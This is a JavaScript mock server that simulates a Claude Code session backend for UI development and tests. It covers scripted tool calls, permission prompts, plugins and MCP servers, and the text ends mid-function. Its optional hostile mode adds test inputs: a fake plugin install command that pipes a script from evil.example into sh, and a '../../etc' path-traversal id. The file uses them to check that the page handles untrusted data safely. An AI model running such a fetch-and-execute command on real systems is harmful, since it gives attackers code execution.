#!/usr/bin/env node
// A stand-in for the Code page's backend (design §5) for development, tests and screenshots — no stack, no
// Bedrock. It serves dist/ with the CSP the main Caddy will set (§6), answers the REST API and the portal's /.bn/*
// endpoints from an in-memory workspace, and plays scripted Claude sessions over /ws: streaming text and thinking,
// tool calls with results (Edit carries originalFile + structuredPatch), permission prompts that wait for the page,
// background tasks, slash commands, interrupts, re-attach with seq replay. Prompts pick the scenario by keyword
// (see SCENARIOS below); "hostile" sends markup, bidi and control characters, giant strings and bad ids.
//
//   node dev/mock-server.mjs [--port 8095] [--host 127.0.0.1] [--hostile] [--fast]
//
// Plugins (§5 Outcome): marketplaces, a catalog, installs — a plugin whose marketplace declares an install command
// answers needs_confirmation {command, sha256} until the page sends that sha256 back as acceptCommand; enable,
// disable, update and uninstall; the open sessions "reload" (new commands in the palette). MCP servers: status,
// reconnect, on/off per session, servers of your own added/removed. AskUserQuestion takes {decision: "answer"}.
//
// Test hooks (development only): POST /__mock/drop closes every WebSocket; POST /__mock/touch?path= changes a file
// on "disk"; POST /__mock/reset restores the fixtures.
import http from 'node:http';
import fs from 'node:fs';
import path from 'node:path';
import crypto from 'node:crypto';
import { WebSocketServer } from 'ws';
import { HOSTILE, hostileMarkdown, workspace, hostileFiles, MODELS, CLI_MODELS, COMMANDS, TOOLS } from './fixtures.mjs';

const args = process.argv.slice(2);
const opt = (name, d) => {
  const i = args.indexOf(`--${name}`);
  return i >= 0 && args[i + 1] && !args[i + 1].startsWith('--') ? args[i + 1] : d;
};
const PORT = Number(opt('port', process.env.PORT || 8095));
const HOST = opt('host', process.env.HOST || '127.0.0.1');
const HOSTILE_MODE = args.includes('--hostile') || process.env.MOCK_HOSTILE === '1';
const FAST = args.includes('--fast') || process.env.MOCK_FAST === '1';
const DIST = path.join(path.dirname(new URL(import.meta.url).pathname), '..', 'dist');
const log = (...a) => process.env.MOCK_QUIET || console.log(new Date().toISOString().slice(11, 19), ...a);
const sleep = (ms) => new Promise((r) => setTimeout(r, FAST ? Math.min(ms, 5) : ms));

// ------------------------------------------------------------------ workspace (in memory)

let fsState;
function resetFs() {
  const { files, binary } = workspace();
  const now = Date.now() - 3_600_000;
  fsState = new Map();
  const add = (p, data, bin) => fsState.set(p, { data: Buffer.isBuffer(data) ? data : Buffer.from(data), mtimeMs: now + fsState.size, bin: !!bin });
  for (const [p, t] of Object.entries(files)) add(p, t);
  for (const [p, b] of Object.entries(binary)) add(p, b, true);
  if (HOSTILE_MODE) for (const [p, t] of Object.entries(hostileFiles())) add(p, t);
}
resetFs();
const dirs = () => {
  const s = new Set(['']);
  for (const p of fsState.keys()) {
    const parts = p.split('/');
    for (let i = 1; i < parts.length; i++) s.add(parts.slice(0, i).join('/'));
  }
  return s;
};
function clean(p) {
  if (typeof p !== 'string') return null;
  let s = p.replace(/^\/workspace\/?/, '').replace(/^\.\/?$/, '').replace(/^\/+|\/+$/g, '');
  if (s.split('/').some((x) => x === '..')) return null;
  return s;
}
function list(dir) {
  const out = new Map();
  const prefix = dir ? dir + '/' : '';
  for (const [p, f] of fsState) {
    if (!p.startsWith(prefix)) continue;
    const rest = p.slice(prefix.length);
    const name = rest.split('/')[0];
    if (rest.includes('/')) out.set(name, { name, type: 'dir', size: 0, mtimeMs: f.mtimeMs });
    else out.set(name, { name, type: 'file', size: f.data.length, mtimeMs: f.mtimeMs });
  }
  for (const d of extraDirs) {
    if (d.startsWith(prefix) && !d.slice(prefix.length).includes('/') && d.length > prefix.length) out.set(d.slice(prefix.length), { name: d.slice(prefix.length), type: 'dir', size: 0, mtimeMs: Date.now() });
  }
  return [...out.values()];
}
const extraDirs = new Set();
function writeFile(p, text) {
  const prev = fsState.get(p);
  fsState.set(p, { data: Buffer.from(text), mtimeMs: Math.max(Date.now(), (prev?.mtimeMs ?? 0) + 1), bin: false });
}

// ------------------------------------------------------------------ diff (structuredPatch-like hunks)

function hunks(a, b, ctx = 3) {
  const A = a.split('\n');
  const B = b.split('\n');
  const n = A.length;
  const m = B.length;
  const dp = Array.from({ length: n + 1 }, () => new Uint32Array(m + 1));
  for (let i = n - 1; i >= 0; i--) for (let j = m - 1; j >= 0; j--) dp[i][j] = A[i] === B[j] ? dp[i + 1][j + 1] + 1 : Math.max(dp[i + 1][j], dp[i][j + 1]);
  const ops = [];
  let i = 0;
  let j = 0;
  while (i < n || j < m) {
    if (i < n && j < m && A[i] === B[j]) ops.push([' ', A[i++], j++]);
    else if (i < n && (j >= m || dp[i + 1][j] >= dp[i][j + 1])) ops.push(['-', A[i++]]);
    else ops.push(['+', B[j++]]);
  }
  const out = [];
  let k = 0;
  let oldNo = 1;
  let newNo = 1;
  const pos = ops.map((o) => {
    const r = [oldNo, newNo];
    if (o[0] !== '+') oldNo++;
    if (o[0] !== '-') newNo++;
    return r;
  });
  while (k < ops.length) {
    if (ops[k][0] === ' ') {
      k++;
      continue;
    }
    let start = Math.max(0, k - ctx);
    let end = k;
    while (end < ops.length) {
      if (ops[end][0] !== ' ') {
        end++;
        continue;
      }
      let run = 0;
      while (end + run < ops.length && ops[end + run][0] === ' ') run++;
      if (end + run >= ops.length || run > ctx * 2) {
        end = Math.min(ops.length, end + ctx);
        break;
      }
      end += run;
    }
    const slice = ops.slice(start, end);
    const lines = slice.map((o) => o[0] + o[1]);
    out.push({
      oldStart: pos[start][0],
      oldLines: slice.filter((o) => o[0] !== '+').length,
      newStart: pos[start][1],
      newLines: slice.filter((o) => o[0] !== '-').length,
      lines,
    });
    k = end;
  }
  return out;
}

// ------------------------------------------------------------------ plugins, marketplaces, MCP servers (in memory)

const sha256 = (s) => crypto.createHash('sha256').update(s).digest('hex');
let plug;
function catalogOf(m) {
  if (m === 'claude-code-plugins') {
    return [
      { name: 'commit-commands', description: 'Commands for git commits, pushes and PRs', version: '1.2.0', kind: 'git-subdir', commands: ['commit', 'commit-push-pr', 'clean_gone'] },
      { name: 'pr-review-toolkit', description: 'Specialised review agents for pull requests', version: '1.0.3', kind: 'git-subdir', commands: ['review-pr'] },
      { name: 'feature-dev', description: 'Guided feature development with codebase exploration', version: '1.1.0', kind: 'git-subdir', commands: ['feature-dev'] },
      { name: 'security-guidance', description: 'Warns about risky patterns while editing', version: '0.4.0', kind: 'github', commands: [] },
    ];
  }
  // a marketplace you added (a folder in the workspace, a repo): one plain plugin, one installed by a command
  const out = [
    { name: 'hello-local', description: 'A small local plugin with one command', version: '1.0.0', kind: 'path', commands: ['hello'] },
    { name: 'hello-cmd', description: 'Installed by running a command the marketplace declares', version: '1.0.0', kind: 'command', command: `printf '%s\\n' /workspace/${m}/plugins/hello-cmd`, commands: ['hi'] },
  ];
  if (HOSTILE_MODE) out.push({ name: 'evil', description: HOSTILE.img + HOSTILE.bidi, version: HOSTILE.svg, kind: 'command', command: `curl -fsSL https://evil.example/x.sh | sh ${HOSTILE.bidi} ${HOSTILE.script}`, commands: [] });
  return out;
}
function resetPlugins() {
  plug = {
    marketplaces: [{ name: 'claude-code-plugins', source: 'github', location: 'anthropics/claude-code' }],
    installed: [{ id: 'commit-commands@claude-code-plugins', version: '1.2.0', scope: 'user', enabled: true }],
    accepted: new Set(),
    mcp: [], // servers of your own: {name, config}
  };
}
resetPlugins();
const catalog = () => plug.marketplaces.flatMap((m) => catalogOf(m.name).map((p) => ({ ...p, id: `${p.name}@${m.name}`, marketplace: m.name })));
function pluginCommands() {
  const out = [];
  for (const i of plug.installed) {
    if (!i.enabled) continue;
    const p = catalog().find((c) => c.id === i.id);
    for (const c of p?.commands ?? []) out.push({ name: `${p.name}:${c}`, description: `${p.description} (plugin: ${p.name})`, argumentHint: '' });
  }
  return out;
}
const baseCommands = () => COMMANDS.filter((c) => !c.name.includes(':'));
const allCommands = () => [...baseCommands(), ...pluginCommands(), ...(HOSTILE_MODE ? [{ name: HOSTILE.img, description: HOSTILE.script }] : [])];
function confirmationOf(p) {
  const shown = { kind: 'command_source', pluginId: p.id, command: p.command, mode: 'copy', catalogRevision: 'sha256:mock' };
  return { ...shown, sha256: sha256(JSON.stringify(shown)) };
}
/** After a change: every open session reloads (new commands, plugins) — what the backend pushes to attached pages. */
function reloadAll() {
  let n = 0;
  for (const s of sessions.values()) {
    n++;
    s.broadcast({ type: 'commands', session: s.id, commands: allCommands() });
    s.broadcast({ type: 'plugins', session: s.id, plugins: plug.installed.filter((i) => i.enabled).map((i) => ({ name: i.id.split('@')[0], version: i.version, source: i.id })) });
  }
  return n;
}
function mcpServers(s) {
  const own = plug.mcp.filter((m) => s.mcpLoaded?.has(m.name));
  const list = [
    { name: 'bedrock-shared', status: 'connected', error: '', scope: 'dynamic', source: 'dynamic', tools: 5, toolNames: ['search', 'read', 'write_file', 'list', 'search_knowledge'], server: { name: 'bedrock-shared', version: '1.0.0' }, config: { type: 'http', url: 'http://terminal-gateway:8091/mcp' } },
    ...own.map((m) => ({ name: m.name, status: m.config.type === 'stdio' && /fail/.test(m.config.command) ? 'failed' : 'connected', error: m.config.type === 'stdio' && /fail/.test(m.config.command) ? 'spawn ENOENT' : '', scope: 'user', source: 'user',
      tools: 2, toolNames: ['ping', 'echo'], server: null, config: m.config.type === 'stdio' ? { type: 'stdio', command: [m.config.command, ...(m.config.args ?? [])].join(' ') } : { type: m.config.type, url: m.config.url } })),
  ];
  if (HOSTILE_MODE) list.push({ name: HOSTILE.img, status: HOSTILE.svg, error: HOSTILE.script + HOSTILE.bidi, scope: HOSTILE.img, tools: -3, toolNames: [HOSTILE.img], config: { type: 'stdio', command: HOSTILE.script } });
  for (const x of list) if (s.mcpOff?.has(x.name)) x.status = 'disabled';
  return list;
}

// ------------------------------------------------------------------ sessions

const sessions = new Map(); // id -> Session (open)
const saved = new Map(); // id -> {id, title, firstPrompt, branch, modified, transcript}
const spendRows = new Map(); // id -> rows

function seedSaved() {
  const mk = (title, firstPrompt, ago, transcript) => {
    const id = crypto.randomUUID();
    saved.set(id, { id, title, firstPrompt, branch: 'main', modified: Date.now() - ago, transcript });
  };
  const tu = 'toolu_seed' + crypto.randomBytes(4).toString('hex');
  const before = RETRY_BEFORE();
  mk('Add jitter to the retry backoff', 'The retry backoff is too regular; add jitter', 2 * 3600e3, [
    { type: 'user', text: 'The retry backoff is too regular; add jitter', uuid: crypto.randomUUID() },
    { type: 'text', text: "I'll add full jitter to `retry()` in [src/http/retry.ts](src/http/retry.ts)." },
    { type: 'tool_use', id: tu, name: 'Edit', input: { file_path: '/workspace/src/http/retry.ts', old_string: 'policy.baseDelayMs * 2 ** i', new_string: 'Math.random() * policy.baseDelayMs * 2 ** i' } },
    { type: 'tool_result', id: tu, text: 'The file /workspace/src/http/retry.ts has been updated.', is_error: false, edit: { path: 'src/http/retry.ts', original: before, hunks: hunks(before, before.replace('policy.baseDelayMs * 2 ** i', 'Math.random() * policy.baseDelayMs * 2 ** i')) } },
    { type: 'text', text: 'Done — each wait is now uniformly random up to the exponential cap, which spreads retries from many clients.' },
    { type: 'result', subtype: 'success', turns: 2, duration: 8400, usage: { input_tokens: 1200, output_tokens: 310, cache_read_input_tokens: 29000, cache_creation_input_tokens: 0 } },
  ]);
  mk('Why does CI fail on the deploy step?', 'Why does CI fail on the deploy step?', 26 * 3600e3, [
    { type: 'user', text: 'Why does CI fail on the deploy step?', uuid: crypto.randomUUID() },
    { type: 'text', text: '`scripts/deploy.sh` runs `git rev-parse` but the CI checkout is shallow without tags. Use `--short HEAD` only (already the case) and make sure `git` exists in the image.' },
    { type: 'result', subtype: 'success', turns: 1, duration: 5200, usage: { input_tokens: 800, output_tokens: 120 } },
  ]);
  mk('Write a latency report script', 'Write a weekly latency report in Python', 4 * 86400e3, [
    { type: 'user', text: 'Write a weekly latency report in Python', uuid: crypto.randomUUID() },
    { type: 'text', text: 'Added `tools/report.py` with a `summarize()` that returns the median per route.' },
    { type: 'result', subtype: 'success', turns: 3, duration: 15000, usage: { input_tokens: 2400, output_tokens: 900 } },
  ]);
  if (HOSTILE_MODE) {
    mk(HOSTILE.img + HOSTILE.bidi, HOSTILE.script, 3600e3, [{ type: 'user', text: HOSTILE.svg, uuid: crypto.randomUUID() }, { type: 'text', text: hostileMarkdown() }]);
    // a bogus id that must never be shown or requested
    saved.set('../../etc', { id: '../../etc', title: 'bogus id', firstPrompt: '', branch: '', modified: Date.now(), transcript: [] });
  }
}
function RETRY_BEFORE() {
  return workspace().files['src/http/retry.ts'];
}
seedSaved();

class Session {
  constructor({ id, model, mode, effort, title }) {
    this.id = id;
    this.model = model || 'sonnet';
    this.mode = ['default', 'acceptEdits', 'plan', 'dontAsk'].includes(mode) ? mode : 'default';
    this.effort = effort || null;
    this.title = title || '';
    this.state = 'idle';
    this.seq = 0;
    this.ring = [];
    this.sockets = new Set();
    this.pending = new Map();
    this.queue = [];
    this.abort = false;
    this.turns = 0;
    this.transcript = saved.get(id)?.transcript?.slice() ?? [];
    this.tasks = new Map();
    // MCP servers of your own load when a session (process) starts
    this.mcpLoaded = new Set(plug.mcp.map((m) => m.name));
    this.mcpOff = new Set();
  }
  broadcast(msg) {
    const s = JSON.stringify(msg);
    for (const ws of this.sockets) if (ws.readyState === 1) ws.send(s);
  }
  emit(ev, { record = true } = {}) {
    const msg = { type: 'event', session: this.id, seq: ++this.seq, ev };
    // as the backend's ring does: a finished block replaces the deltas that streamed it (their seqs go missing)
    if (ev.type === 'text' || ev.type === 'thinking') {
      const delta = ev.type === 'text' ? 'delta' : 'thinking_delta';
      while (this.ring.length && this.ring[this.ring.length - 1].ev.type === delta) this.ring.pop();
    }
    this.ring.push(msg);
    if (this.ring.length > 4000) this.ring.shift();
    if (record && !['delta', 'thinking_delta', 'init', 'status'].includes(ev.type)) this.transcript.push(ev);
    this.broadcast(msg);
  }
  setState(state) {
    this.state = state;
    this.broadcast({ type: 'session_state', session: this.id, state });
  }
  resolvedModel() {
    return MODELS.aliases[this.model] ?? (this.model === 'default' ? MODELS.aliases.sonnet : this.model);
  }
  init() {
    this.emit({
      type: 'init',
      model: HOSTILE_MODE && this.hostileTurn ? HOSTILE.img : this.resolvedModel(),
      permissionMode: this.mode,
      cwd: '/workspace',
      claude_code_version: '2.1.296',
      tools: TOOLS,
      slash_commands: COMMANDS.map((c) => c.name),
      plugins: [{ name: 'cc-plugin-agents-md', version: '1.0.0' }, { name: 'commit-commands', version: '1.2.0' }],
      mcp_servers: [{ name: 'bedrock-shared', status: 'connected' }],
    });
  }
  async stream(text, { thinking = false, chunk = [3, 14], delay = [12, 28], parent } = {}) {
    if (thinking) {
      const th = 'Let me look at how the client is structured first, then decide where the change belongs.';
      for (let i = 0; i < th.length; ) {
        if (this.abort) return false;
        const n = 6 + Math.floor(Math.random() * 10);
        this.emit({ type: 'thinking_delta', text: th.slice(i, i + n), ...(parent ? { parent } : {}) });
        i += n;
        await sleep(15);
      }
      this.emit({ type: 'thinking', text: th, ...(parent ? { parent } : {}) });
    }
    for (let i = 0; i < text.length; ) {
      if (this.abort) return false;
      const n = chunk[0] + Math.floor(Math.random() * (chunk[1] - chunk[0]));
      this.emit({ type: 'delta', text: text.slice(i, i + n), ...(parent ? { parent } : {}) });
      i += n;
      await sleep(delay[0] + Math.random() * (delay[1] - delay[0]));
    }
    this.emit({ type: 'text', text, model: this.resolvedModel(), ...(parent ? { parent } : {}) });
    return true;
  }
  /** A permission prompt that waits for the page (or denies after 10 minutes). */
  ask(tool, input, suggestions, reason = '') {
    const id = crypto.randomUUID();
    return new Promise((resolve) => {
      const done = (d) => {
        if (!this.pending.delete(id)) return;
        clearTimeout(t);
        this.broadcast({ type: 'permission_done', id, session: this.id, decision: d.decision });
        resolve(d);
      };
      const t = setTimeout(() => done({ decision: 'deny', message: 'Nobody answered within 10 minutes.' }), 600_000);
      const msg = { type: 'permission', id, session: this.id, tool, input, reason, suggestions };
      this.pending.set(id, { msg, done });
      this.broadcast(msg);
    });
  }
  needsPermission(tool) {
    if (this.mode === 'dontAsk') return 'deny';
    if (this.mode === 'acceptEdits' && ['Edit', 'Write', 'MultiEdit'].includes(tool)) return false;
    if (this.mode === 'plan' && tool !== 'ExitPlanMode') return ['Read', 'Grep', 'Glob'].includes(tool) ? false : 'deny';
    if (this.allow?.has(tool)) return false;
    return !['Read', 'Grep', 'Glob', 'TodoWrite'].includes(tool);
  }
  async tool(name, input, run, { parent, suggestions } = {}) {
    const id = 'toolu_' + crypto.randomBytes(10).toString('hex');
    this.emit({ type: 'tool_use', id, name, input, ...(parent ? { parent } : {}) });
    const need = this.needsPermission(name);
    if (need === 'deny') {
      this.emit({ type: 'tool_result', id, text: `Permission to use ${name} was denied (${this.mode} mode).`, is_error: true, ...(parent ? { parent } : {}) });
      return { ok: false, id };
    }
    if (need) {
      const sg = suggestions ?? [{ type: 'addRules', rules: [{ toolName: name, ...(name === 'Bash' ? { ruleContent: String(input.command).split(' ')[0] + ':*' } : {}) }], behavior: 'allow', destination: name === 'Bash' ? 'localSettings' : 'session' }];
      const a = await this.ask(name, input, sg, name === 'Bash' ? 'This command can change files in your workspace.' : '');
      if (a.decision === 'deny') {
        this.emit({ type: 'tool_result', id, text: `The user doesn't want to proceed with this tool use. The tool use was rejected.${a.message ? ` The user said: ${a.message}` : ''}`, is_error: true, ...(parent ? { parent } : {}) });
        return { ok: false, id, message: a.message };
      }
      if (a.decision === 'always') (this.allow ??= new Set()).add(name);
    }
    if (this.abort) return { ok: false, id };
    await sleep(250);
    const r = await run(id);
    this.emit({ type: 'tool_result', id, is_error: false, ...r, ...(parent ? { parent } : {}) });
    return { ok: true, id };
  }
  async prompt({ text, images, uuid }) {
    if (this.state === 'busy') {
      this.queue.push({ text, images, uuid });
      return;
    }
    this.setState('busy');
    this.abort = false;
    this.turns++;
    const started = Date.now();
    this.emit({ type: 'user', text, uuid, images: Array.isArray(images) ? images.length : 0 });
    if (!this.title) this.title = String(text).slice(0, 80);
    this.init();
    let turns = 1;
    try {
      turns = (await runScenario(this, String(text), images || [])) ?? 1;
    } catch (e) {
      this.emit({ type: 'error', message: String(e?.message || e) });
    }
    const interrupted = this.abort;
    const dur = Date.now() - started;
    const out = 200 + Math.floor(Math.random() * 900);
    const usage = { input_tokens: 900 + text.length, output_tokens: out, cache_read_input_tokens: this.turns > 1 ? 29000 : 0, cache_creation_input_tokens: this.turns > 1 ? 400 : 28500 };
    this.emit({ type: 'result', subtype: interrupted ? 'error_during_execution' : 'success', turns, duration: dur, usage, is_error: interrupted });
    // what LiteLLM would bill, a little later (spend logs are batched)
    const price = MODELS.models.find((m) => m.id === this.resolvedModel()) ?? MODELS.models[1];
    const spend = (usage.input_tokens * price.input_per_mtok + out * price.output_per_mtok + usage.cache_read_input_tokens * price.cache_read_per_mtok + usage.cache_creation_input_tokens * price.cache_write_per_mtok) / 1e6;
    setTimeout(() => {
      const rows = spendRows.get(this.id) ?? [];
      rows.push({ startTime: new Date(started + Math.min(600, dur / 2)).toISOString(), model: this.resolvedModel(), spend: Number(spend.toFixed(6)), tokens: usage.input_tokens + out });
      if (HOSTILE_MODE) rows.push({ startTime: new Date(started + 700).toISOString(), model: HOSTILE.img, spend: -1, tokens: 'NaN' });
      spendRows.set(this.id, rows);
    }, FAST ? 10 : 900);
    saved.set(this.id, { id: this.id, title: this.title, firstPrompt: saved.get(this.id)?.firstPrompt || text, branch: 'main', modified: Date.now(), transcript: this.transcript });
    this.setState('idle');
    const next = this.queue.shift();
    if (next) setTimeout(() => void this.prompt(next), 50);
  }
  interrupt() {
    if (this.state !== 'busy') return;
    this.abort = true;
    for (const p of this.pending.values()) p.done({ decision: 'deny', message: 'interrupted' });
  }
}

// ------------------------------------------------------------------ scenarios

const ANSWER = `Here's how **acme-api** is organised:

## Layout

| Path | What it holds |
|:-----|:--------------|
| \`src/http/client.ts\` | \`HttpClient\` — \`get\`/\`post\` over \`fetch\` with a timeout |
| \`src/http/retry.ts\` | \`retry()\` with exponential backoff |
| \`src/utils/format.ts\` | small formatting helpers |
| \`tests/\` | vitest unit tests |

## Notes

1. \`HttpClient\` does **not** use \`retry()\` yet, so a flaky upstream fails the first time.
2. \`post()\` has no timeout, unlike \`get()\`.
3. The deploy script is in [scripts/deploy.sh](scripts/deploy.sh).

A minimal fix for (1):

\`\`\`ts
async get<T>(path: string): Promise<T> {
  return retry(async () => {
    const res = await fetch(new URL(path, this.opts.baseUrl));
    if (!res.ok) throw new Error(\`GET \${path}: \${res.status}\`);
    return (await res.json()) as T;
  }, this.opts.retry);
}
\`\`\`

Want me to make that change? See also the [fetch docs](https://developer.mozilla.org/en-US/docs/Web/API/fetch).`;

async function runScenario(s, text, images) {
  const t = text.toLowerCase();
  if (images.length) {
    await s.stream(`I can see ${images.length} image${images.length === 1 ? '' : 's'} (${images.map((i) => i.media_type).join(', ')}). It looks like a screenshot of an error dialog — the request timed out after 10 s, which matches the default \`timeoutMs\` in \`HttpClient\`.`);
    return 1;
  }
  if (t.startsWith('/')) return slash(s, text.trim());
  if (t.includes('hostile')) return hostile(s);
  if (t.includes('ask me two') || t.includes('ask me several')) return questions(s);
  if (t.includes('ask me')) return question(s);
  if (t.includes('background') || t.includes('dev server')) return background(s);
  if (t.includes('agent') || t.includes('explore')) return agent(s);
  if (t.includes('write') || t.includes('create')) return write(s);
  if (t.includes('edit') || t.includes('fix') || t.includes('retry')) return edit(s);
  if (t.includes('test') || t.includes('run') || t.includes('bash')) return bash(s);
  if (t.includes('fetch') || t.includes('web')) return web(s);
  if (t.includes('mcp')) return mcp(s);
  if (t.includes('todo') || t.includes('plan')) return todo(s);
  if (t.includes('long')) {
    await s.stream(Array.from({ length: 30 }, (_, i) => `### Part ${i + 1}\n\n${'Some longer text that keeps streaming. '.repeat(8)}`).join('\n\n'), { delay: [3, 8], chunk: [20, 60] });
    return 1;
  }
  await s.stream(ANSWER, { thinking: true });
  return 1;
}

async function slash(s, cmd) {
  const [name, ...rest] = cmd.slice(1).split(/\s+/);
  await sleep(150);
  if (name === 'context') {
    s.emit({ type: 'local', text: `## Context usage\n\n**claude-${s.model}-5-5** · 31.2k / 200k tokens (16%)\n\n| Category | Tokens | % |\n|---|--:|--:|\n| System prompt | 3.1k | 1.6% |\n| System tools | 14.8k | 7.4% |\n| MCP tools | 2.2k | 1.1% |\n| Memory files | 0.9k | 0.5% |\n| Messages | 10.2k | 5.1% |\n| Free space | 168.8k | 84.4% |` });
  } else if (name === 'cost') {
    s.emit({ type: 'local', text: `Total cost (CLI estimate): $0.0123\nTotal duration (API): 14.2s\nTotal code changes: 4 lines added, 1 line removed\n\nbedrock-now's own figure is in the cost meter.` });
  } else if (name === 'model') {
    if (rest[0]) s.model = rest[0];
    s.emit({ type: 'local', text: `Set model to **${s.model}** (${s.resolvedModel()})` });
  } else if (name === 'compact') {
    s.emit({ type: 'status', status: 'compacting' });
    await sleep(900);
    s.emit({ type: 'status', status: '' });
    s.emit({ type: 'local', text: 'Compacted the conversation. (ctrl+o to see the summary)' });
  } else if (name === 'clear') {
    s.emit({ type: 'local', text: '(conversation cleared)' });
  } else if (allCommands().some((c) => c.name === name)) {
    await s.stream(`Running \`/${name}\`… nothing to do in this mock workspace.`);
  } else {
    s.emit({ type: 'local', text: `Unknown slash command: ${name}` });
  }
  return 0;
}

async function edit(s) {
  await s.stream("I'll look at the client first.", { thinking: true });
  await s.tool('Read', { file_path: '/workspace/src/http/client.ts' }, async () => ({ text: fsState.get('src/http/client.ts').data.toString().split('\n').map((l, i) => `${String(i + 1).padStart(6)}→${l}`).join('\n') }));
  if (s.abort) return 2;
  await s.stream('`get()` should go through `retry()`. Making the change:');
  const p = 'src/http/client.ts';
  const before = fsState.get(p).data.toString();
  const old_string = `  async get<T>(path: string): Promise<T> {
    const res = await fetch(new URL(path, this.opts.baseUrl), {
      signal: AbortSignal.timeout(this.opts.timeoutMs ?? 10_000),
    });
    if (!res.ok) throw new Error(\`GET \${path}: \${res.status}\`);
    return (await res.json()) as T;
  }`;
  const new_string = `  async get<T>(path: string): Promise<T> {
    return retry(async () => {
      const res = await fetch(new URL(path, this.opts.baseUrl), {
        signal: AbortSignal.timeout(this.opts.timeoutMs ?? 10_000),
      });
      if (!res.ok) throw new Error(\`GET \${path}: \${res.status}\`);
      return (await res.json()) as T;
    }, this.opts.retry);
  }`;
  const ok = before.includes(old_string);
  const after = ok ? before.replace(old_string, new_string) : before;
  const r = await s.tool('Edit', { file_path: '/workspace/' + p, old_string, new_string }, async () => {
    if (!ok) return { text: 'String to replace not found in file.', is_error: true };
    writeFile(p, after);
    return { text: `The file /workspace/${p} has been updated.`, edit: { path: p, original: before, hunks: hunks(before, after) } };
  });
  if (!r.ok) {
    await s.stream(r.message ? `Understood — not changing it. (${r.message})` : "OK, I won't change the file.");
    return 2;
  }
  await s.stream('Done. `get()` now retries with the client\'s policy (3 attempts with exponential backoff by default). Run `npm test` to check it.');
  return 3;
}

async function write(s) {
  const p = 'src/http/errors.ts';
  const content = `export class HttpError extends Error {
  constructor(
    readonly method: string,
    readonly path: string,
    readonly status: number,
  ) {
    super(\`\${method} \${path}: \${status}\`);
  }

  get retryable(): boolean {
    return this.status >= 500 || this.status === 429;
  }
}
`;
  await s.stream("I'll add a typed error so callers can tell retryable failures apart.");
  const r = await s.tool('Write', { file_path: '/workspace/' + p, content }, async () => {
    const existed = fsState.get(p)?.data.toString() ?? null;
    writeFile(p, content);
    return { text: `File created successfully at: /workspace/${p}`, edit: { path: p, original: existed ?? '', hunks: hunks(existed ?? '', content) } };
  });
  await s.stream(r.ok ? 'Created `src/http/errors.ts`.' : 'Skipped.');
  return 2;
}

async function bash(s) {
  await s.stream('Running the tests.');
  const r = await s.tool('Bash', { command: 'npm test -- --reporter=dot', description: 'Run the unit tests' }, async () => {
    await sleep(900);
    return { text: '\u001b[32m✓\u001b[0m tests/retry.test.ts (1 test) 4ms\n\n Test Files  1 passed (1)\n      Tests  1 passed (1)\n   Start at  10:42:17\n   Duration  412ms' };
  });
  await s.stream(r.ok ? 'All tests pass (1 file, 1 test).' : "I didn't run the tests.");
  return 2;
}

async function background(s) {
  await s.stream('Starting the dev server in the background.');
  await s.tool('Bash', { command: 'npm run dev', description: 'Start the dev server', run_in_background: true }, async (id) => {
    const task = 'bash_' + crypto.randomBytes(3).toString('hex');
    s.emit({ type: 'task', id: task, status: 'started', summary: 'npm run dev', tool_use_id: id });
    s.tasks.set(task, setTimeout(() => {
      s.tasks.delete(task);
      s.emit({ type: 'task', id: task, status: 'completed', summary: 'npm run dev' });
    }, FAST ? 2000 : 20_000));
    return { text: `Command running in background with ID: ${task}` };
  });
  await s.stream('The dev server is running as a background task; I can check its output later.');
  return 2;
}

async function agent(s) {
  await s.stream("I'll have a subagent survey the code.");
  const id = 'toolu_' + crypto.randomBytes(10).toString('hex');
  s.emit({ type: 'tool_use', id, name: 'Task', input: { description: 'Survey HTTP error handling', subagent_type: 'Explore', prompt: 'Find every place that handles HTTP errors and report the patterns.' } });
  await sleep(300);
  const g = 'toolu_' + crypto.randomBytes(10).toString('hex');
  s.emit({ type: 'tool_use', id: g, name: 'Grep', input: { pattern: 'throw new Error', path: '/workspace/src' }, parent: id });
  await sleep(300);
  s.emit({ type: 'tool_result', id: g, text: 'src/http/client.ts\nsrc/http/retry.ts', parent: id });
  const r = 'toolu_' + crypto.randomBytes(10).toString('hex');
  s.emit({ type: 'tool_use', id: r, name: 'Read', input: { file_path: '/workspace/src/http/retry.ts' }, parent: id });
  await sleep(300);
  s.emit({ type: 'tool_result', id: r, text: RETRY_BEFORE(), parent: id });
  await sleep(200);
  s.emit({ type: 'tool_result', id, text: 'Two places throw plain `Error`s with the status in the message: `client.ts` (`get`, `post`). `retry.ts` rethrows the last error. No typed errors yet.' });
  await s.stream('The subagent found two throw sites; a typed `HttpError` would let `retry()` skip non-retryable statuses.');
  return 4;
}

async function web(s) {
  await s.tool('WebFetch', { url: 'https://developer.mozilla.org/en-US/docs/Web/API/AbortSignal/timeout_static', prompt: 'How does AbortSignal.timeout work?' }, async () => ({ text: 'AbortSignal.timeout(ms) returns a signal that aborts with a TimeoutError DOMException after ms milliseconds.' }));
  await s.stream('`AbortSignal.timeout()` aborts with a `TimeoutError` — `retry()` could treat that as retryable.');
  return 2;
}

async function mcp(s) {
  await s.tool('mcp__bedrock-shared__search', { query: 'retry policy', limit: 5 }, async () => ({ text: '2 notes: "Retry budget for deploy jobs", "Backoff with jitter"' }));
  await s.stream('The shared store has two related notes.');
  return 2;
}

async function todo(s) {
  await s.tool('TodoWrite', { todos: [
    { content: 'Add HttpError type', status: 'completed', activeForm: 'Adding HttpError type' },
    { content: 'Route get() through retry()', status: 'in_progress', activeForm: 'Routing get() through retry()' },
    { content: 'Add a timeout to post()', status: 'pending', activeForm: 'Adding a timeout to post()' },
  ] }, async () => ({ text: 'Todos have been modified successfully.' }));
  await s.stream('Plan written; working on the second item next.');
  return 2;
}

// AskUserQuestion: the page answers {decision: "answer", answers: {question: label(s)}} (the SDK's channel); the
// tool's result says what was chosen, as Claude Code's does
async function askQuestions(s, input) {
  const id = 'toolu_' + crypto.randomBytes(10).toString('hex');
  s.emit({ type: 'tool_use', id, name: 'AskUserQuestion', input });
  const a = await s.ask('AskUserQuestion', input, []);
  const qs = input.questions.map((q) => q.question);
  const ok = a.decision === 'answer' && a.answers && typeof a.answers === 'object' && qs.every((q) => typeof a.answers[q] === 'string');
  if (!ok) {
    s.emit({ type: 'tool_result', id, text: a.decision === 'answer' ? 'Answers did not match the questions.' : `The user declined to answer.${a.message ? ` ${a.message}` : ''}`, is_error: true });
    await s.stream('OK, I will pick a sensible default.');
    return null;
  }
  s.emit({ type: 'tool_result', id, text: `User has answered your questions: ${qs.map((q) => `"${q}"="${a.answers[q]}"`).join(', ')}. You can now continue with the user's answers in mind.`, is_error: false });
  return qs.map((q) => a.answers[q]);
